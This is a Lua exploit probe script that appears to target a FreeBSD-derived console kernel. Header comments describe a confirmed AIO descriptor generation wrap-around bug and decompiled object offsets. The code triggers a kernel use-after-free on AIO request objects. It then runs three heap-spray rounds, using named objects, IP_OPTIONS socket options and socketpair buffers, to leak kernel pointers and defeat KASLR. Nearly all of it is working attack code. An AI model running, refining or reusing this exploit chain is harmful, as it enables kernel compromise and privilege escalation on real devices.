-- CRASH_CLASS: HIGH
-- PROBE 70b: KASLR defeat via generation wrap-around UAF + cross-subsystem spray
--
-- 70a CONFIRMED:
--   - LIFO slot reuse is PERFECT for AIO descriptors
--   - 3-bit generation wraps after exactly 8 alloc/free cycles
--   - Stale ID deletion SUCCEEDS once generation wraps (status=0)
--   - The NEW object's R is freed by the stale delete
--   - wrap_id poll returns 0x80020003 → kernel freed the live request
--
-- DECOMPILE (VERIFICATION_DECOMPILE.md):
--   R+0x00 = curthread+0x390 (kernel thread address, NOT zeroed before free)
--   R+0x08 = curthread+0x08  (kernel thread address, NOT zeroed before free)
--   R+0x10 = credential ref  (ZEROED before free)
--   R is 0x30 bytes (48B) in a 64B UMA bucket
--
-- PLAN:
--   1. Submit target AIO → R allocated with kernel ptrs at +0x00/+0x08
--   2. Poll target
--   3. Generation-wrap the slot: 8× submit+poll+delete on same slot
--   4. Submit victim AIO → new R in same slot, gen matches stale ID
--   5. Stale-delete via original ID → victim's R freed (UAF)
--   6. Spray 64B objects (namedobj, setsockopt, socketpair buffers) to reclaim R
--   7. Read back spray data → if R+0x00/+0x08 survived, KASLR defeated

print("=== PROBE 70b: KASLR via generation wrap-around + spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function uaf_one_slot()
    -- Allocate 5 padding IDs to hold adjacent slots
    local pads = {}
    for i = 1, 5 do
        local id = submit_one()
        if id ~= 0 then table.insert(pads, id) end
    end

    -- Allocate victim in its own slot
    local victim_id = submit_one()
    if victim_id == 0 then
        for _, p in ipairs(pads) do pcall(function() poll_one(p); delete_one(p) end) end
        return nil, nil
    end
    local victim_slot = victim_id % 0x2000
    local victim_gen = math.floor(victim_id / 0x2000)

    -- Poll + delete victim → gen bumps
    poll_one(victim_id)
    delete_one(victim_id)

    -- Cycle slot 7 more times → generation wraps (total 8 increments)
    for cycle = 1, 7 do
        local id = submit_one()
        if id == 0 then break end
        poll_one(id)
        delete_one(id)
    end

    -- Next submit on this slot should have wrapped generation
    local new_id = submit_one()
    if new_id == 0 then
        for _, p in ipairs(pads) do pcall(function() poll_one(p); delete_one(p) end) end
        return nil, nil
    end

    -- Poll new request (prerequisite for readback queries)
    poll_one(new_id)

    -- Stale-delete using original victim_id → frees new_id's R object
    local st = delete_one(victim_id)
    if st ~= 0 then
        -- Did not work, clean up
        pcall(function() delete_one(new_id) end)
        for _, p in ipairs(pads) do pcall(function() poll_one(p); delete_one(p) end) end
        return nil, nil
    end

    -- R is now freed but new_id's descriptor entry still references it
    -- The freed R has kernel thread pointers at +0x00 and +0x08
    -- Clean up padding but keep new_id alive (its R is the UAF target)
    for _, p in ipairs(pads) do pcall(function() poll_one(p); delete_one(p) end) end

    return new_id, victim_id
end

-- ============================================================
-- [A] CALIBRATION: confirm wrap-around UAF works, measure sizes
-- ============================================================
print("[A] Calibration: confirm generation wrap-around UAF")

local cal_new, cal_stale = uaf_one_slot()
if cal_new then
    print(string.format("  UAF slot obtained: new=0x%04X (R freed, descriptor dangling)", cal_new))

    -- Verify: poll should show freed
    local cal_poll = poll_one(cal_new)
    print(string.format("  poll(new_id) = 0x%08X %s", cal_poll,
        cal_poll == 0x80020003 and "(freed, expected)" or "(unexpected)"))

    -- Clean up: try to delete (may fail since already freed)
    pcall(function() delete_one(cal_new) end)

    -- Measure sys 624 VM ops per AIO submit for spray calibration
    local pre = nil; pcall(function() pre = mk(624)(uint64(0)) end)
    local mids = {}
    for i = 1, 16 do
        local id = submit_one()
        if id ~= 0 then table.insert(mids, id) end
    end
    local post = nil; pcall(function() post = mk(624)(uint64(0)) end)
    if pre and post then
        print(string.format("  624 delta for %d AIO submits: %d (%.1f per submit)",
            #mids, N(post) - N(pre), (N(post) - N(pre)) / math.max(1, #mids)))
    end
    for _, mid in ipairs(mids) do pcall(function() poll_one(mid); delete_one(mid) end) end
else
    print("  FAIL: could not obtain UAF slot")
end

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] MASS UAF + NAMEDOBJ SPRAY + READBACK
-- ============================================================
print("")
print("[B] Generation-wrap UAF -> namedobj spray -> lookup readback")

local SPRAY_COUNT = 128
local ROUNDS = 5
local kaslr_found = false

for round = 1, ROUNDS do
    if not alive() or kaslr_found then break end

    -- Create multiple UAF R slots
    local uaf_ids = {}
    local uaf_count = 0
    for attempt = 1, 16 do
        if not alive() then break end
        local new_id, _ = uaf_one_slot()
        if new_id then
            table.insert(uaf_ids, new_id)
            uaf_count = uaf_count + 1
        end
    end

    if uaf_count == 0 then
        print(string.format("  round %d: 0 UAFs obtained, skip", round))
    else
        -- Spray namedobj with 47-byte names (48B alloc → 64B bucket = R's bucket)
        local spray_handles = {}
        for i = 1, SPRAY_COUNT do
            local name = string.format("K%02d_%04d_SPRAY_KASLR_PAD_TO_47_BYTES_XXXXXXXXX", round, i)
            name = name:sub(1, 47)
            local nm = put_str(name)
            local ret = nil
            pcall(function() ret = mk(557)(uint64(N(nm))) end)
            if ret then
                local h, l = get_hi_lo(ret)
                if l ~= 0xFFFFFFFF then
                    table.insert(spray_handles, {handle = ret, name = name, nm_ptr = nm})
                end
            end
        end

        -- Now submit fresh AIO to write kernel pointers into any reclaimed R slots
        local fresh_ids = {}
        for i = 1, uaf_count * 4 + 32 do
            local fid = submit_one()
            if fid ~= 0 then table.insert(fresh_ids, fid) end
        end

        -- Read back namedobj names via lookup
        -- If a namedobj's name buffer overlaps a freed R that was reclaimed,
        -- the kernel pointer at R+0x00 would corrupt the name → lookup fails
        local anomalies = 0
        for _, no in ipairs(spray_handles) do
            local ret2 = nil
            pcall(function() ret2 = mk(540)(no.nm_ptr) end)
            if ret2 then
                local h2, l2 = get_hi_lo(ret2)
                local oh, ol = get_hi_lo(no.handle)
                if l2 == 0xFFFFFFFF and ol ~= 0xFFFFFFFF then
                    anomalies = anomalies + 1
                    if anomalies <= 8 then
                        print(string.format("  round %d NOBJ KILLED: expected=%s (name corrupted by kptr?)",
                            round, fmt(no.handle)))
                    end
                elseif l2 ~= ol then
                    anomalies = anomalies + 1
                    if anomalies <= 8 then
                        print(string.format("  round %d NOBJ mismatch: expected=%s got=%s",
                            round, fmt(no.handle), fmt(ret2)))
                    end
                end
            end
        end

        -- Clean up
        for _, fid in ipairs(fresh_ids) do
            pcall(function() poll_one(fid); delete_one(fid) end)
        end
        for _, no in ipairs(spray_handles) do
            pcall(function() mk(558)(no.handle) end)
        end
        for _, uid in ipairs(uaf_ids) do
            pcall(function() delete_one(uid) end)
        end

        print(string.format("  round %d: %d UAFs, %d spray, anomalies=%d",
            round, uaf_count, #spray_handles, anomalies))
    end
end

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] MASS UAF + IP_OPTIONS SPRAY + GETSOCKOPT READBACK
-- ============================================================
print("")
print("[C] Generation-wrap UAF -> IP_OPTIONS spray -> getsockopt readback")

local IPPROTO_IP = 0
local IP_OPTIONS = 1
local sock_pool = {}
for i = 1, 128 do
    local ret = nil
    pcall(function() ret = mk(97)(uint64(2), uint64(2), uint64(17)) end)
    if ret then
        local s = sgn(ret)
        if s >= 0 then table.insert(sock_pool, s) end
    end
end
print("  UDP socket pool: " .. #sock_pool)

for round = 1, ROUNDS do
    if not alive() or kaslr_found then break end

    local uaf_ids = {}
    local uaf_count = 0
    for attempt = 1, 16 do
        if not alive() then break end
        local new_id, _ = uaf_one_slot()
        if new_id then
            table.insert(uaf_ids, new_id)
            uaf_count = uaf_count + 1
        end
    end

    if uaf_count == 0 then
        print(string.format("  round %d: 0 UAFs", round))
    else
        -- Spray IP_OPTIONS: setsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, buf, 40)
        -- Kernel allocates ~44B for ip_opts → could land in 64B bucket
        local optbuf = memory.alloc(44)
        for off = 0, 39 do
            pcall(function() memory.write_byte(N(optbuf) + off, 0x01) end)
        end
        local sprayed = 0
        for _, fd in ipairs(sock_pool) do
            pcall(function()
                mk(105)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                    uint64(N(optbuf)), uint64(40))
            end)
            sprayed = sprayed + 1
        end

        -- Read back via getsockopt and check for kernel pointer contamination
        local getbuf = memory.alloc(64)
        local getlen = memory.alloc(8)
        local kptr_hits = 0
        for _, fd in ipairs(sock_pool) do
            for off = 0, 56, 4 do wd(N(getbuf) + off, 0xDEADDEAD) end
            wd(N(getlen), 44)
            pcall(function()
                mk(118)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                    uint64(N(getbuf)), uint64(N(getlen)))
            end)
            local got_len = rd(N(getlen)) or 0

            if got_len > 0 then
                for off = 0, math.min(got_len, 44) - 4, 4 do
                    local dw = rd(N(getbuf) + off) or 0
                    if dw >= 0xFFFF8000 then
                        local next_dw = rd(N(getbuf) + off + 4) or 0
                        if dw ~= 0xFFFFFFFF and dw ~= 0xDEADDEAD then
                            kptr_hits = kptr_hits + 1
                            if kptr_hits <= 10 then
                                print(string.format("  round %d KPTR at fd=%d off=%d: 0x%08X_%08X *** KASLR ***",
                                    round, fd, off, dw, next_dw))
                                kaslr_found = true
                            end
                        end
                    end
                end
            end
        end

        -- Clean up
        for _, uid in ipairs(uaf_ids) do
            pcall(function() delete_one(uid) end)
        end

        print(string.format("  round %d: %d UAFs, %d sprayed, kptr_hits=%d",
            round, uaf_count, sprayed, kptr_hits))
    end
end

-- Close socket pool
for _, fd in ipairs(sock_pool) do
    pcall(function() mk(6)(uint64(fd)) end)
end

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] MASS UAF + SOCKETPAIR WRITE SPRAY + READBACK
-- ============================================================
print("")
print("[D] Generation-wrap UAF -> socketpair write spray -> recv readback")

local SPAIR_COUNT = 64
local spairs = {}
for i = 1, SPAIR_COUNT do
    local fds_buf = memory.alloc(8)
    wd(N(fds_buf), 0xFFFFFFFF); wd(N(fds_buf) + 4, 0xFFFFFFFF)
    pcall(function()
        mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(fds_buf)))
    end)
    local f0 = sgn(rd(N(fds_buf)) or -1)
    local f1 = sgn(rd(N(fds_buf) + 4) or -1)
    if f0 >= 0 and f1 >= 0 then
        table.insert(spairs, {w = f0, r = f1})
    end
end
print("  socketpairs: " .. #spairs)

-- Set all write ends non-blocking
for _, sp in ipairs(spairs) do
    local nb_buf = memory.alloc(4); wd(N(nb_buf), 1)
    pcall(function()
        mk(54)(uint64(sp.w), uint64(0x8004667E), uint64(N(nb_buf)))
    end)
end

for round = 1, ROUNDS do
    if not alive() or kaslr_found then break end

    local uaf_ids = {}
    local uaf_count = 0
    for attempt = 1, 16 do
        if not alive() then break end
        local new_id, _ = uaf_one_slot()
        if new_id then
            table.insert(uaf_ids, new_id)
            uaf_count = uaf_count + 1
        end
    end

    if uaf_count == 0 then
        print(string.format("  round %d: 0 UAFs", round))
    else
        -- Spray: write exactly 48 bytes into each socketpair
        -- Kernel allocates an mbuf for socket buffer data
        -- Small writes may go into mbuf inline data (not separate alloc)
        -- We write a sentinel pattern to detect overlap
        local wbuf = memory.alloc(48)
        for off = 0, 44, 4 do wd(N(wbuf) + off, 0x42424242) end
        local write_ok = 0
        for _, sp in ipairs(spairs) do
            local ret = nil
            pcall(function()
                ret = mk(4)(uint64(sp.w), uint64(N(wbuf)), uint64(48))
            end)
            if ret and sgn(ret) > 0 then write_ok = write_ok + 1 end
        end

        -- Read back and scan for kernel pointers
        local rbuf = memory.alloc(64)
        local kptr_hits = 0
        for _, sp in ipairs(spairs) do
            for off = 0, 60, 4 do wd(N(rbuf) + off, 0xDEADDEAD) end
            local ret = nil
            pcall(function()
                ret = mk(3)(uint64(sp.r), uint64(N(rbuf)), uint64(48))
            end)
            local got = ret and sgn(ret) or 0
            if got > 0 then
                for off = 0, got - 4, 4 do
                    local dw = rd(N(rbuf) + off) or 0
                    if dw >= 0xFFFF8000 and dw ~= 0xFFFFFFFF and dw ~= 0xDEADDEAD then
                        kptr_hits = kptr_hits + 1
                        local next_dw = rd(N(rbuf) + off + 4) or 0
                        if kptr_hits <= 10 then
                            print(string.format("  round %d KPTR at off=%d: 0x%08X_%08X *** KASLR ***",
                                round, off, dw, next_dw))
                            kaslr_found = true
                        end
                    end
                    if dw ~= 0x42424242 and dw ~= 0xDEADDEAD then
                        if kptr_hits == 0 and round <= 2 then
                            print(string.format("  round %d unexpected at off=%d: 0x%08X",
                                round, off, dw))
                        end
                    end
                end
            end
        end

        -- Clean up
        for _, uid in ipairs(uaf_ids) do
            pcall(function() delete_one(uid) end)
        end

        print(string.format("  round %d: %d UAFs, %d writes, kptr_hits=%d",
            round, uaf_count, write_ok, kptr_hits))
    end
end

-- Close socketpairs
for _, sp in ipairs(spairs) do
    pcall(function() mk(6)(uint64(sp.w)) end)
    pcall(function() mk(6)(uint64(sp.r)) end)
end

if not alive() then print("DEAD after section D"); return end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
if kaslr_found then
    print("*** KASLR DEFEATED: kernel pointer(s) leaked via UAF + spray ***")
else
    print("No kernel pointers found this run.")
    print("Possible reasons:")
    print("  - Spray objects don't land in R's 64B UMA bucket (different zone)")
    print("  - R+0x00/+0x08 are overwritten by the zone free-list linkage")
    print("  - Need different spray sizes or more UAF slots")
end

print("")
print("=== PROBE 70b COMPLETE ===")
